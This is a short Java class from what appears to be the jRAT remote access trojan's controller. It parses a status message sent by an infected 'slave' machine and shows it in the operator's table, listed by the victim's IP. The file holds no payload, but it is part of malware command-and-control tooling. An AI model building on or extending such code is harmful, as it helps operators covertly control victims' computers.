package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.Utils;


public class Packet13Status extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String status = slave.readLine();

		try {
			int istatus = Integer.parseInt(status);

			slave.setStatus(istatus);
		} catch (Exception ex) {
			Frame.mainModel.setValueAt(status, Utils.getRow(3, slave.getIP()), 2);
		}
	}
}
